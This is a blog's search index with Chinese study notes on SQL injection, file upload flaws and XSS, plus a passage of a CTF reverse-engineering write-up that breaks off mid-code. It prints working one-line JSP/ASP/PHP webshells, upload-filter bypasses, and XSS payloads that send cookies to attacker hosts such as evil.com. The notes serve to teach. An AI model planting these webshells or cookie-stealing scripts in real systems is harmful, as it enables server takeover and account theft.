<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>web安全学习总结——SQL注入概述</title>
    <url>/2020/02/26/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<center>圣人之道，为而不争</center>

<p><img src="https://i.loli.net/2020/02/26/RmkuazI2SvYyNod.png" alt="origindddal.png"></p>
<a id="more"></a>

<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><h2 id="SQL语言"><a href="#SQL语言" class="headerlink" title="SQL语言"></a>SQL语言</h2><blockquote>
<p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
</blockquote>
<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote>
<p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
</blockquote>
<h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><blockquote>
<p>没有对用户的输入输出进行安全过滤，导致后台直接将用户的输入作为SQL语句的一部分，执行操作，产生危害</p>
<p>通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
</blockquote>
<h1 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h1><h2 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h2><ul>
<li>​    基于错误的SQL注入</li>
<li>​    联合查询的类型</li>
<li>​    堆查询注射</li>
<li>​    SQL 盲注<ul>
<li>基于布尔SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
</li>
</ul>
<h2 id="基于如何处理输入的SQL查询-数据类型"><a href="#基于如何处理输入的SQL查询-数据类型" class="headerlink" title="基于如何处理输入的SQL查询(数据类型)"></a>基于如何处理输入的SQL查询(数据类型)</h2><ul>
<li>基于字符串</li>
<li>基于报错的SQL盲注</li>
</ul>
<h2 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h2><ul>
<li>一阶注入</li>
</ul>
<blockquote>
<p>一阶注入是指输入的注射语句对WEB直接产生了影响，出现了结果。</p>
</blockquote>
<ul>
<li>二阶注入</li>
</ul>
<blockquote>
<p>二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其他的辅助间接的对WEB产生危害，这样的就被成为是二阶注入</p>
</blockquote>
<h2 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h2><ul>
<li>通过用户输入的表单域的注射</li>
<li>通过Cookie注射</li>
<li>通过服务器变量注射。（基于头部信息的注射）</li>
</ul>
<h1 id="0x04-漏洞危害"><a href="#0x04-漏洞危害" class="headerlink" title="0x04 漏洞危害"></a>0x04 漏洞危害</h1><p>危害非常高，例如：</p>
<ul>
<li>数据库信息泄露</li>
<li>网页篡改</li>
<li>网站被挂马，传播恶意软件</li>
<li>数据库被恶意操纵</li>
<li>服务器被远程控制，被安葬后门</li>
<li>破坏硬盘数据，瘫痪全系统</li>
</ul>
<h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05 漏洞防御"></a>0x05 漏洞防御</h1><h2 id="注入原因"><a href="#注入原因" class="headerlink" title="注入原因"></a>注入原因</h2><ul>
<li>不正当的类型处理</li>
<li>不安全的数据库配置</li>
<li>不合理的查询集处理</li>
<li>不当的错误处理</li>
<li>转义字符处理不合适</li>
<li>多个提交处理不当</li>
</ul>
<h2 id="存在位置"><a href="#存在位置" class="headerlink" title="存在位置"></a>存在位置</h2><ul>
<li>任何客户端可控，传递到服务器的变量</li>
<li>必须带有参数传递，参数值带入到数据库查询</li>
<li>服务器没有进行过滤或者过滤不严格</li>
</ul>
<h2 id="代码层面防御"><a href="#代码层面防御" class="headerlink" title="代码层面防御"></a>代码层面防御</h2><blockquote>
<p>对用户输入的内容进行转义（PHP中addslashes()、mysql_real_escape()函数）。<br>限制关键字的输入（PHP中preg_replace()函数正则替换关键字），限制输入的长度 。<br>使用SQL语句预处理，对SQL语句首先进行预编译，然后进行参数绑定，最后传入参数。</p>
</blockquote>
<h2 id="网络层面防御"><a href="#网络层面防御" class="headerlink" title="网络层面防御"></a>网络层面防御</h2><blockquote>
<p>部署防火墙</p>
</blockquote>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/xiaoqiyue/p/9026859.html" target="_blank" rel="noopener">SQL注入</a></p>
<p><a href="https://www.cnblogs.com/lsdb/p/9612424.html" target="_blank" rel="noopener">SQL注入理解与防御</a></p>
<p><a href="https://xz.aliyun.com/t/5878#toc-51" target="_blank" rel="noopener">[红日安全]Web安全Day1 - SQL注入实战攻防</a></p>
<p><a href="https://blog.csdn.net/BeatRex/article/details/91901196" target="_blank" rel="noopener">SQL注入分类、防御</a></p>
]]></content>
      <categories>
        <category>Web安全学习总结</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>学习总结</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习总结—文件上传漏洞概述</title>
    <url>/2020/02/10/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<center>知之始己，自知而后知人也。</center>

<p><img src="https://i.loli.net/2020/02/10/WkJhMvH3AUzwKPB.png" alt="oriddddddginal.png"></p>
<a id="more"></a>

<h2 id="0x01漏洞简介"><a href="#0x01漏洞简介" class="headerlink" title="0x01漏洞简介"></a>0x01漏洞简介</h2><p>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>大部分文件上传漏洞的产生是因为Web应用程序没有对上传文件的格式进行严格过滤 , 还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护。</p>
<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
<h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><p>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞 , 攻击者甚至可以直接上传一个webshell到服务器上。</p>
<p>恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件等。</p>
<h2 id="0x04-Webshell"><a href="#0x04-Webshell" class="headerlink" title="0x04 Webshell"></a>0x04 Webshell</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>1.根据文件大小分类：大马和小马(通常指的是一句话木马，能够使用菜刀这类工具去直接连接它)</p>
<p>2.根据脚本名称分类：jsp、asp、aspx、php</p>
<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>1）jsp的简单的webshell:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>));%&gt;</span><br></pre></td></tr></table></figure>

<p>2）asp的简单的webshell:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">success!!!!&lt;%eval request(&quot;cmd&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<p>3）php的简单的webshell:</p>
<ul>
<li><p>php经典一句话:</p>
<figure class="highlight plain"><figcaption><span>echo shell_exec($_GET['cmd']);?>```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 中国菜刀：</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;&lt;?php @eval($_POST[&#39;自定义密码&#39;]);?&gt; 然后连接菜刀就能直接进服务器了</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="0x05漏洞绕过"><a href="#0x05漏洞绕过" class="headerlink" title="0x05漏洞绕过"></a>0x05漏洞绕过</h2><h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><p>1 进行正常的上传，期间可抓包查看</p>
<p>2 尝试上传不同类型的恶意脚本文件，如JSP PHP文件等</p>
<p>3 查看是否在前端做了上传限制，如大小，格式，并尝试进行绕过</p>
<p>4 利用报错或者猜测等方式获得木马路径，访问</p>
<h3 id="常见上传点"><a href="#常见上传点" class="headerlink" title="常见上传点"></a>常见上传点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上传头像</span><br><span class="line">上传相册</span><br><span class="line">上传附件</span><br><span class="line">添加文章图片</span><br><span class="line">前台留言资料上传</span><br><span class="line">编辑器文件上传</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p>
<p>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
<p>绕过方式：可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
<h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><h4 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h4><p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">                &#123;   </span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">                 <span class="keyword">exit</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">         $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">         $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">         <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>判断方式：可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
<p>绕过方式：我们可以通过抓包，将content-type字段改为image/gif</p>
<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2） .gif，”GIF 89A”<br>（3） .zip，”Zip Compressed”<br>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>
<p>绕过方式：在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>



<h4 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h4><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方式：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx<br>php php php3 php4<br>exe exee</p>
<h4 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h4><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg<br>伪代码演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D; getname(httprequest) &#x2F;&#x2F;假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span><br><span class="line">type &#x3D;gettype(name)        &#x2F;&#x2F;而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span><br><span class="line">if(type &#x3D;&#x3D; jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   &#x2F;&#x2F;但在这里却是以 0x00 作为文件名截断</span><br><span class="line">&#x2F;&#x2F;最后以 help.asp 存入路径里</span><br></pre></td></tr></table></figure>



<h2 id="0x06漏洞防御"><a href="#0x06漏洞防御" class="headerlink" title="0x06漏洞防御"></a>0x06漏洞防御</h2><h3 id="文件校验的几点建议"><a href="#文件校验的几点建议" class="headerlink" title="文件校验的几点建议"></a>文件校验的几点建议</h3><ul>
<li>文件扩展名服务端白名单校验。</li>
<li>文件内容服务端校验。</li>
<li>隐藏上传文件路径。</li>
<li>检查上传文件的类型和大小</li>
<li>上传文件做日志记录</li>
<li>上传文件要保存的文件名和目录名由系统根据时间生成，不允许用户自定义</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/6357" target="_blank" rel="noopener">任意文件上传实战攻防</a></p>
<p><a href="https://blog.csdn.net/wtf0712/article/details/83795653" target="_blank" rel="noopener">文件上传漏洞原理及防御</a></p>
<p><a href="https://xz.aliyun.com/t/6692" target="_blank" rel="noopener">论文件上传绕过的各种姿势</a></p>
<p><a href="https://xz.aliyun.com/t/276#toc-2" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></p>
]]></content>
      <categories>
        <category>Web安全学习总结</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>学习总结</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习总结—XSS漏洞概述</title>
    <url>/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<center>敦兮其若朴，旷兮其若谷</center>

<p><img src="https://i.loli.net/2020/01/06/3vFUh1Z5mVB8gKW.png" alt="preview.png"></p>
<a id="more"></a>

<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>跨站脚本攻击-XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。</p>
<p>XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击目的，形成了一次有效的XSS攻击。一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨 大的，是web安全的头号大敌。</p>
<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS<br>主要是GET类型</p>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。<br>例如：<code>&lt;srcipt&gt;alert(/xss/)&lt;/srcipt&gt;</code></p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM型是特殊的反射型XSS<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxxx/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><blockquote>
<p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。</p>
</blockquote>
<h3 id="盗取Cookie"><a href="#盗取Cookie" class="headerlink" title="盗取Cookie"></a>盗取Cookie</h3><p>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/xssTest/test.php?userName=&lt;scriipt src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://www.xxxx.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);  </span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。<br>一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。</p>
<h3 id="蠕虫攻击"><a href="#蠕虫攻击" class="headerlink" title="蠕虫攻击"></a>蠕虫攻击</h3><p>可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用</p>
<h3 id="常用XSS语句"><a href="#常用XSS语句" class="headerlink" title="常用XSS语句"></a>常用XSS语句</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//经典语句</span></span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(<span class="string">'XSS'</span>)&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href = javasript:alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x04-漏洞绕过"><a href="#0x04-漏洞绕过" class="headerlink" title="0x04 漏洞绕过"></a>0x04 漏洞绕过</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
<p>比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(“xss”);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<p>可以转换为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ScRipt&gt;ALeRt(“XSS”);<span class="xml"><span class="tag">&lt;/<span class="name">sCRipT</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h3 id="关闭标签"><a href="#关闭标签" class="headerlink" title="关闭标签"></a>关闭标签</h3><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
<p>比如: </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“Hi”);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h3 id="使用hex编码绕过"><a href="#使用hex编码绕过" class="headerlink" title="使用hex编码绕过"></a>使用hex编码绕过</h3><p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
<p>比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(“xss”);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<p>可以转换为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">3</span>c%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>e%<span class="number">61</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">78</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>b%<span class="number">3</span>c%<span class="number">2</span>f%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>e</span><br></pre></td></tr></table></figure>



<h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p>三个八进制数；如果不够前面补0<br>两个十六进制数字；如果不够前面补0<br>四个十六进制数字；如果不够前面补0<br>控制字符</p>
<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>以<code>&amp;</code>开始<code>;</code>结束</p>
<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>%27<br>考虑HTML的渲染方式选择合适的编码方式进行测试</p>
<h2 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05 漏洞防御"></a>0x05 漏洞防御</h2><p>过滤输入的数据，和非法字符<code>‘ “ &lt; &gt; on* 等”’</code><br>输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等</p>
]]></content>
      <categories>
        <category>Web安全学习总结</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>学习总结</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-Reverse-novice</title>
    <url>/2020/01/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reverse-novice/</url>
    <content><![CDATA[<center>合抱之木，生于毫末；九层之台，起于累土；千里之行，始于足下。</center>


<p><img src="https://i.loli.net/2020/01/06/dVjgOJ5mKsLZCH7.png" alt="wallhaven-672007-1.png"></p>
<a id="more"></a>

<p>这篇文章记录了攻防世界逆向区，新手练习区的破解记录。</p>
<p>小白第一次写，如有错误还望各位师傅斧正</p>
<h1 id="0x01-insanity"><a href="#0x01-insanity" class="headerlink" title="0x01 insanity"></a>0x01 insanity</h1><blockquote>
<p>2020年1月6日</p>
</blockquote>
<h2 id="起手式"><a href="#起手式" class="headerlink" title="起手式"></a>起手式</h2><p>题目描述：菜鸡觉得前面的题目太难了，来个简单的缓一下</p>
<p>查看程序详细信息。</p>
<p><img src="https://i.loli.net/2020/01/06/qxnZgiopujEkN5z.png" alt="Snipaste_2020-01-06_16-54-02.png"></p>
<p>发现这不是PE文件，是32位ELF文件。</p>
<h2 id="开始表演"><a href="#开始表演" class="headerlink" title="开始表演"></a>开始表演</h2><p>首先我们将文件拖入 IDA 。</p>
<h3 id="分析ing"><a href="#分析ing" class="headerlink" title="分析ing"></a>分析ing</h3><p>老套路,<code>Shift +F12</code>打开string窗口,一键找出所有的字符串。</p>
<p>这。。。好像有什么奇怪的东西</p>
<p><img src="https://i.loli.net/2020/01/06/Ni3ZXcxUgHk1ySO.png" alt="Snipaste_2020-01-06_16-44-56.png"></p>
<p>感觉这是一个flag，因为太明显了</p>
<p><img src="https://i.loli.net/2020/01/06/a5iz7MpJTLnXSA4.png" alt="Snipaste_2020-01-06_16-46-51.png"></p>
<p>提交成功，emmmm</p>
<p><img src="https://i.loli.net/2020/01/06/1v2fldX8wEsMQYG.png" alt="93eb91a4468f30c3252fc7159054f93.png"></p>
<p>这样就结束了，很不真实的感觉</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看到flag时还有一丝丝，没想到是真的。</p>
<p>刚准备分析就结束了，好快！！！</p>
<h1 id="0x02-open-source"><a href="#0x02-open-source" class="headerlink" title="0x02 open-source"></a>0x02 open-source</h1><blockquote>
<p>2020年1月7日</p>
</blockquote>
<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>题目描述：菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码</p>
<p>打开题目，这是一段源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span 